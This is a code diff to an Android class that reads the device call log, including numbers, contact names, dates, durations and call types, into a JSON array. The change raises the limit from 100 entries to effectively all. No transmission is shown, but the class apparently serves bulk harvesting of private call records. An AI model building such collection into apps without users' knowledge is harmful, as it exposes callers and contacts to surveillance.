@@ -11,23 +11,23 @@ import java.util.Date;
 public class RealCallLogCollector {
     private static final String TAG = "RealCallLogCollector";
     private Context context;
-    
+
     public RealCallLogCollector(Context context) {
         this.context = context;
     }
-    
+
     public JSONArray getCallLogs() {
         JSONArray callLogs = new JSONArray();
         Cursor cursor = null;
         
         try {
-            Log.d(TAG, "📞 Collecting REAL call logs from device...");
+            Log.d(TAG, "📱 Starting call logs collection...");
             
             String[] projection = new String[]{
                 CallLog.Calls.NUMBER,
                 CallLog.Calls.TYPE,
-                CallLog.Calls.DURATION,
                 CallLog.Calls.DATE,
+                CallLog.Calls.DURATION,
                 CallLog.Calls.CACHED_NAME
             };
             
@@ -36,48 +36,32 @@ public class RealCallLogCollector {
                 projection,
                 null,
                 null,
-                CallLog.Calls.DATE + " DESC LIMIT 100"
+                CallLog.Calls.DATE + " DESC LIMIT 1000000"
             );
             
             if (cursor != null && cursor.moveToFirst()) {
-                int count = 0;
                 do {
-                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
-                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
-                    
-                    // Only process calls with real numbers
-                    if (number != null && !number.trim().isEmpty()) {
+                    try {
                         JSONObject call = new JSONObject();
-                        call.put("number", number.trim());
-                        call.put("name", name != null ? name.trim() : "Unknown");
-                        call.put("type", getCallType(type));
-                        call.put("duration", duration);
-                        call.put("timestamp", date);
-                        call.put("readable_date", new Date(date).toString());
-                        call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
+                        call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                        call.put("type", getCallType(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
+                        call.put("date", new Date(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))).toString());
+                        call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                        call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                         
                         callLogs.put(call);
-                        count++;
-                        
-                        if (count <= 5) {
-                            Log.d(TAG, "📞 REAL Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
-                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error parsing call log: " + e.getMessage());
                     }
-                    
                 } while (cursor.moveToNext());
-                
-                Log.d(TAG, "✅ Collected " + count + " REAL call logs from device");
-            } else {
-                Log.w(TAG, "📭 No REAL call logs found in device");
             }
             
+            Log.d(TAG, "✅ Collected " + callLogs.length() + " call logs");
+            
         } catch (SecurityException e) {
-            Log.e(TAG, "❌ Call log permission denied - NO CALL LOGS DATA COLLECTED: " + e.getMessage());
+            Log.e(TAG, "❌ Call log permission denied: " + e.getMessage());
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading REAL call logs: " + e.getMessage());
+            Log.e(TAG, "❌ Call log collection error: " + e.getMessage());
         } finally {
             if (cursor != null) {
                 cursor.close();
@@ -89,13 +73,13 @@ public class RealCallLogCollector {
     
     private String getCallType(int type) {
         switch (type) {
-            case CallLog.Calls.INCOMING_TYPE: return "incoming";
-            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
-            case CallLog.Calls.MISSED_TYPE: return "missed";
-            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
-            case CallLog.Calls.REJECTED_TYPE: return "rejected";
-            case CallLog.Calls.BLOCKED_TYPE: return "blocked";
-            default: return "unknown";
+            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
+            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
+            case CallLog.Calls.MISSED_TYPE: return "MISSED";
+            case CallLog.Calls.VOICEMAIL_TYPE: return "VOICEMAIL";
+            case CallLog.Calls.REJECTED_TYPE: return "REJECTED";
+            case CallLog.Calls.BLOCKED_TYPE: return "BLOCKED";
+            default: return "UNKNOWN";
         }
     }
 }
